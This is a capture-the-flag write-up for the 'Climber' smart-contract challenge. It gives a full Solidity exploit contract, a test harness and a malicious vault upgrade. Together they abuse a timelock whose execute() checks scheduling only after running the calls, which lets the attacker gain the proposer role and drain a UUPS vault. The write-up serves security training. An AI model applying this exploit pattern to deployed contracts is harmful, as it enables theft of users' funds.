@@ -1,0 +1,117 @@
+# Challenge #12 - Climber
+ There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.
+
+ The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
+
+ On the vault there's an additional role with powers to sweep all tokens in case of an emergency.
+
+ On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.
+
+ Your goal is to empty the vault. 
+
+## Privilege escalation 
+In this challenge, we are able to escalate to admin privileges to execute admin level functions. 
+The most important one beeing the ``upgradeToAndCall()`` in the UUPS proxy contract which enables an 
+attacker to change the contract logic of the proxy contract and drain the funds manipulating the 
+``sweepFunds()`` in the ``ClimberVault.sol`` smart contract.  
+
+The exploit starts in the ``ClimberTimelock.sol`` smart contract as we have the ability to
+delegatecall functions with the ``execute()``. In order to call this function we have to first 
+schedule the tasks which require the sender to be part of a POSPONER_ROLE. Luckily, for us 
+the execute() only checks if the tasks has been scheduled after all the tasks have been executed, beeing 
+vulnerable to exploit. 
+
+## Exploit Smart Contract Code
+```sol
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Itimelock {
+    function schedule(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) external;
+
+	function execute(
+        address[] calldata targets,
+        uint256[] calldata values,
+        bytes[] calldata dataElements,
+        bytes32 salt
+    ) external payable;
+}
+
+contract EXPLOIT_CLIMBER {
+	Itimelock timelock;
+	address[] targets;
+	uint256[] values; 
+	bytes[] dataElements;
+	bytes32 salt;
+
+	function exec(
+		address _timelock, 
+		address _vault,
+		address _vaultV2,
+		address _token
+	) 
+	external {
+		// Update delay to 0
+		targets.push(_timelock);
+		values.push(0);
+		dataElements.push(abi.encodeWithSignature("updateDelay(uint64)",0));
+
+		// Add attacker to PROSPOSER_ROLE
+		targets.push(_timelock);
+		values.push(0);
+		dataElements.push(
+			abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"), address(this))
+		);
+
+		// Upgrade Contract
+		targets.push(_vault);
+		values.push(0);
+		dataElements.push(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",
+			_vaultV2,
+			abi.encodeWithSignature("sweepFunds(address,address)", _token, msg.sender)
+		));
+
+		// Schedule tasks
+		targets.push(address(this));
+		values.push(0);
+		dataElements.push(abi.encodeWithSignature("schedule()"));
+		
+		// Init contract
+		salt = "sigkill9";
+		timelock = Itimelock(_timelock);
+		timelock.execute(targets, values, dataElements, salt); 
+	}
+
+	function schedule() external {
+		timelock.schedule(targets, values, dataElements, salt);
+	}
+}
+
+```
+Finnally, execute the exploit.
+```js
+    it('Exploit', async function () {        
+        /** CODE YOUR EXPLOIT HERE */
+		this.exploit = await (await ethers.getContractFactory('EXPLOIT_CLIMBER', attacker)).deploy();
+		this.vaultV2 = await (await ethers.getContractFactory("ClimberVaultV2", attacker)).deploy();
+		await this.exploit.exec(
+			this.timelock.address, 
+			this.vault.address,
+			this.vaultV2.address,
+			this.token.address
+		);
+    });
+```
+For the new smart contract I upload in ``ClimberVaultV2`` I only change the swapFunds() to drain the funds.  
+```sol
+    // Allows attacker to drain funds 
+    function sweepFunds(address tokenAddress, address recipient) external onlyOwner {
+        IERC20 token = IERC20(tokenAddress);
+        require(token.transfer(recipient, token.balanceOf(address(this))), "Transfer failed");
+    }
+```
